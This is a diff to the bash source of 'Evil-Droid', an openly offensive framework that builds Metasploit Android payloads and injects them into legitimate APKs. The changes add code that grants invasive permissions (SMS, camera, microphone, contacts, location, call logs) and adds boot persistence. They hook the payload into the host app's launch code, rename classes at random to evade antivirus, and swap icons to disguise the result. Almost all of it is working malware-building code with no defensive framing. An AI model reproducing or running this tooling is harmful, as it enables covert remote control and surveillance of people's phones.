@@ -1,18 +1,18 @@
 #!/usr/bin/env bash
 #
-# Evil-Droid Framework . version 0.2
+# Evil-Droid Framework . version 0.3
 # Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
 # 
 #                  Created By Mascerano Bachir .
 #                 Website: http://www.dev-labs.co
 #           YTB : https://www.youtube.com/c/mascerano%20bachir  
 #        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
-#Speciak thanks to : MrPedroubuntu , Kader Achraf and Mohammed Yacine
+#Speciak thanks to : MrPedroubuntu , Kader Achraf , youcef yahia and Mohammed Yacine
 #
 # this is an open source tool if you want to modify or add something . Please give me a copy.
 
 # resize terminal window
-resize -s 38 70 > /dev/null
+resize -s 40 70 > /dev/null
 #Colors
 cyan='\e[0;36m'
 lightcyan='\e[96m'
@@ -57,7 +57,8 @@ sleep 2
 path=`pwd`
 lanip=`ip route get 1 | awk '{print $NF;exit}'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-ver="v0.2"
+ver="v0.3"
+APKTOOL="$path/tools/apktool.jar"
 VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
@@ -66,6 +67,7 @@ VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
 VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
 VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
 VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
 echo ""
 sleep 1
 # spinner for Metasploit Generator
@@ -273,6 +275,11 @@ function orig_apk()
 {
  orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
 }
+#function change icon
+function change_icon()
+{
+ iconos=$(zenity --title "☢ CHOOSE ICON ☢" --filename=$path --file-selection --file-filter "*.png" --text "chose your own icon." 2> /dev/null) 
+}
 #function generate payload
 function gen_payload()
 {
@@ -288,13 +295,21 @@ function embed_payload()
  spinlong
  xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
+#function update apktool
+function up_apktook()
+{
+ echo -e $yellow ""
+ echo "[*] Removing 1.apk framework file..."
+ spinlong
+ apktool empty-framework-dir --force > /dev/null 2>&1
+}
 #function apktool
 function apk_decomp()
 {
  echo -e $yellow ""
- echo "[*] Decompiling APK file..."
+ echo "[*] Decompiling Payload APK..."
  spinlong
- xterm -T "Decompiling APK" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
+ xterm -T "Decompiling Payload" -e java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
  rm $apk_name.apk
 }
 function apk_comp()
@@ -302,9 +317,24 @@ function apk_comp()
  echo -e $yellow ""
  echo "[*] Rebuilding APK file..."
  spinlong
- xterm -T "Rebuilding APK" -e apktool b $path/payload > /dev/null 2>&1
- mv payload/dist/$apk_name.apk $path > /dev/null 2>&1
+ xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
  rm -r payload > /dev/null 2>&1
+}
+function apk_decomp1()
+{
+ echo -e $yellow ""
+ echo "[*] Decompiling Original APK..."
+ spinlong
+ xterm -T "Decompiling Original" -e java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
+}
+function apk_comp1()
+{
+ echo -e $yellow ""
+ echo "[*] Rebuilding Backdoored APK..."
+ spinlong
+ xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/original -o evil.apk > /dev/null 2>&1
+ rm -r payload > /dev/null 2>&1
+ rm -r original > /dev/null 2>&1
 }
 #function errors
 function error()
@@ -349,6 +379,79 @@ function postgresql_stop()
 {
  service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 }
+# function adding permission
+function perms()
+{
+ echo -e $yellow ""
+ echo "[*] Adding permission and Hook Smali"
+ spinlong
+ package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
+ package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
+ tmp=$package_name
+ sed -i "5i\ $perms" $path/original/AndroidManifest.xml
+ rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
+ sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
+ cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
+ rc=$?
+ if [ $rc != 0 ];then
+  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
+  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
+  tmp=$app_name
+  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
+  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
+  amanifest="    </application>"
+  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
+  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
+ fi
+ amanifest="    </application>"
+ boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
+ sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
+ android_nam=$tmp
+}
+# functions hook smali
+function hook_smalies()
+{
+ launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+ android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ if [ $android_name ]; then
+  echo
+  echo "##################################################################"
+  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  echo "In line:$hook_num"
+  echo "##################################################################"
+  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
+ elif [ ! -e $android_activity ]; then
+  echo
+  echo "##################################################################"
+  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  echo "In line:$hook_num"
+  echo "##################################################################"
+  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
+  rc=$?
+  if [ $rc != 0 ]; then
+    spinlong
+    echo -e $red ""
+    echo "[x] cant find : $android_activity.smali"
+    echo "[*] try another ..."
+    spinlong
+    sleep 2
+    echo
+    echo "##################################################################"
+    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
+    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+    echo "In line:$hook_num"
+    echo "##################################################################"
+    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
+  fi 
+ fi
+}
 #function flagged by av & updating smalies
 function flagg()
 {
@@ -376,6 +479,108 @@ function flagg()
  sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
  sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
 }
+function flagg_original()
+{
+ echo -e $yellow ""
+ echo "[*] Scrubbing the payload contents to avoid AV signatures..."
+ spinlong
+ rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
+ mv payload/smali/com/metasploit/stage payload/smali/com/metasploit/$VAR1
+ mv payload/smali/com/metasploit/$VAR1/MainBroadcastReceiver.smali payload/smali/com/metasploit/$VAR1/$VAR2.smali
+ mv payload/smali/com/metasploit/$VAR1/MainService.smali payload/smali/com/metasploit/$VAR1/$VAR3.smali
+ mv payload/smali/com/metasploit/$VAR1/Payload.smali payload/smali/com/metasploit/$VAR1/$VAR4.smali
+ sleep 2
+ if [ -f payload/smali/com/metasploit/$VAR1/PayloadTrustManager.smali ]; then
+    echo
+    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
+    apache_svc_stop
+    postgresql_stop
+    exit 1
+ fi
+ echo -e $yellow ""
+ echo "[*] Adding permission and Hook Smali"
+ spinlong
+ sed -i "5i\ $perms" $path/original/AndroidManifest.xml
+ package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
+ package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
+ tmp=$package_name
+ sed -i "s|Lcom/metasploit/stage|L$package_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+ sed -i "s|L$package_name/$VAR1/Payload|L$package_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+ sed -i "s|L$package_name/$VAR1/MainService|L$package_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+ sed -i "s|L$package_name/$VAR1/MainBroadcastReceiver|L$package_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+ cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$package_name > /dev/null 2>&1
+ rc=$?
+ if [ $rc != 0 ];then
+  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
+  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
+  tmp=$app_name
+  sed -i "s|L$package_name/$VAR1|L$app_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+  sed -i "s|L$app_name/$VAR1/$VAR4|L$app_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+  sed -i "s|L$app_name/$VAR1/$VAR3|L$app_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+  sed -i "s|L$app_name/$VAR1/$VAR2|L$app_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
+  cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$app_name > /dev/null 2>&1
+  amanifest="    </application>"
+  boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$app_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.$VAR1.$VAR3'"/></application>'
+  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
+ fi
+ amanifest="    </application>"
+ boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$package_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.$VAR1.$VAR3'"/></application>'
+ sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
+ android_nam=$tmp
+ launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+ android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+  if [ $android_name ]; then
+  echo
+  echo "##################################################################"
+  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  echo "In line:$hook_num"
+  echo "##################################################################"
+  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
+ elif [ ! -e $android_activity ]; then
+  echo
+  echo "##################################################################"
+  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  echo "In line:$hook_num"
+  echo "##################################################################"
+  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
+  rc=$?
+  if [ $rc != 0 ]; then
+    spinlong
+    echo -e $red ""
+    echo "[x] cant find : $android_activity.smali"
+    echo "[*] try another ..."
+    spinlong
+    sleep 2
+    echo
+    echo "##################################################################"
+    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
+    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+    echo "In line:$hook_num"
+    echo "##################################################################"
+    starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
+    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
+  fi
+ fi
+}
+# function chage name and icon
+function merge_name_ico()
+{
+ echo -e $yellow ""
+ echo "[*] Changing name and icon payload..."
+ spinlong
+ label='    <application android:label="@string/app_name">'
+ label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
+ sed -i "s|$label|$label1|g" $path/payload/AndroidManifest.xml 2>&1
+ sed -i "s|MainActivity|$apk_name|g" $path/payload/res/values/strings.xml 2>&1
+ mkdir $path/payload/res/drawable
+ cp $iconos $path/payload/res/drawable/main_icon.png
+}
 #function signing apk
 function sign()
 {
@@ -396,15 +601,12 @@ function sign()
  echo -e $yellow ""
  echo "[*] Attempting to sign the package with your android debug key"
  spinlong
- jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $apk_name.apk androiddebugkey > /dev/null 2>&1
+ jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA evil.apk androiddebugkey > /dev/null 2>&1
  echo -e $yellow 
  echo "[*] Verifying signed artifacts..."
  spinlong
- jarsigner -verify -certs $apk_name.apk > /dev/null 2>&1
+ jarsigner -verify -certs evil.apk > /dev/null 2>&1
  rc=$?
- echo -e $yellow
- echo "[✔] Done."
- spinlong
  if [ $rc != 0 ]; then
    echo -e $red ""
    echo "[!] Failed to verify signed artifacts"
@@ -412,6 +614,22 @@ function sign()
    postgresql_stop
    exit $rc
  fi
+ echo -e $yellow
+ echo "[*] Aligning recompiled APK..."
+ spinlong
+ zipalign 4 evil.apk $apk_name.apk 2>&1
+ rc=$?
+ echo -e $yellow
+ echo "[✔] Done."
+ spinlong
+ if [ $rc != 0 ]; then
+   echo -e $red ""
+   echo "[!] Failed to align recompiled APK"
+   apache_svc_stop
+   postgresql_stop
+   exit $rc
+ fi
+ rm evil.apk > /dev/null 2>&1
 }
 #function ask
 function quests()
@@ -420,8 +638,8 @@ while true; do
    echo ""
    quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
    case $quest in
-   APK-MSF) spinlong;gen_payload;spinlong;apk_decomp;flagg;spinlong;apk_comp;spinlong;sign;return;;
-   ORIGINAL-APK) orig_apk;spinlong;embed_payload;return;;
+   APK-MSF) change_icon;spinlong;gen_payload;spinlong;apk_decomp;flagg;merge_name_ico;spinlong;apk_comp;spinlong;sign;return;;
+   ORIGINAL-APK) orig_apk;spinlong;gen_payload;spinlong;up_apktook;apk_decomp1;spinlong;apk_decomp;flagg_original;spinlong;apk_comp1;spinlong;sign;return;;
    esac
 done
 }
@@ -501,6 +719,7 @@ start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute
     echo -e $lightgreen "|           Author: Mascerano Bachir           |"
     echo -e $lightgreen "|    Evil-Droid Framework $ver - Dev-labs.co   |"
     echo -e $lightgreen "|   Credits to : MrPedroubuntu , Kader Achraf  |"
+    echo -e $lightgreen "|               , youcef yahia                 |"
     echo -e $lightgreen "|              and Mohammed Yacine             |"
     echo -e $lightgreen "┖──────────────────────────────────────────────┙"
     echo ""
@@ -522,9 +741,10 @@ function main()
         echo "|      Hack & Remote android plateform         |"
         echo "┖──────────────────────────────────────────────┙"
         echo "[1] APK MSF                                     "
-        echo "[2] BACKDOOR APK ORIGINAL                       "
-        echo "[3] BYPASS AV APK                               "
-        echo "[4] START LISTENER                              "
+        echo "[2] BACKDOOR APK ORIGINAL (OLD)                 "
+        echo "[3] BACKDOOR APK ORIGINAL (NEW)                 "
+        echo "[4] BYPASS AV APK (ICON CHANGE)                 "
+        echo "[5] START LISTENER                              "
         echo "[c] CLEAN                                       "
         echo "[q] QUIT                                        "
         read -p "[?] Select>: " option
@@ -549,7 +769,7 @@ function main()
                 atkv
                 echo
                 ;;
-            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL"
+            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL (OLD)"
                 echo -e $green
                 get_lhost
                 get_lport
@@ -560,6 +780,7 @@ function main()
                 orig_apk
                 echo
                 spinlong
+                up_apktook
                 embed_payload
                 echo 
                 mv $apk_name.apk $path/evilapk > /dev/null 2>&1
@@ -570,7 +791,36 @@ function main()
                 atkv 
                 echo
                 ;;
-            3)  echo -e $lightgreen "[✔] BYPASS AV APK"
+            3)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL (NEW)"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                payload_name
+                get_payload
+                echo
+                orig_apk
+                echo
+                spinlong
+                gen_payload
+                up_apktook
+                apk_decomp1
+                apk_decomp
+                perms
+                hook_smalies
+                spinlong
+                apk_comp1
+                sign
+                echo 
+                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                error
+                sleep 2
+                echo ""
+                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                atkv 
+                echo
+                ;;
+            4)  echo -e $lightgreen "[✔] BYPASS AV APK"
                 echo -e $green
                 get_lhost
                 get_lport
@@ -587,7 +837,7 @@ function main()
                 atkv 
                 echo
                 ;;
-            4)  echo -e $lightgreen "[✔] START LISTENER"
+            5)  echo -e $lightgreen "[✔] START LISTENER"
                 echo -e $green
                 get_lhost
                 get_lport
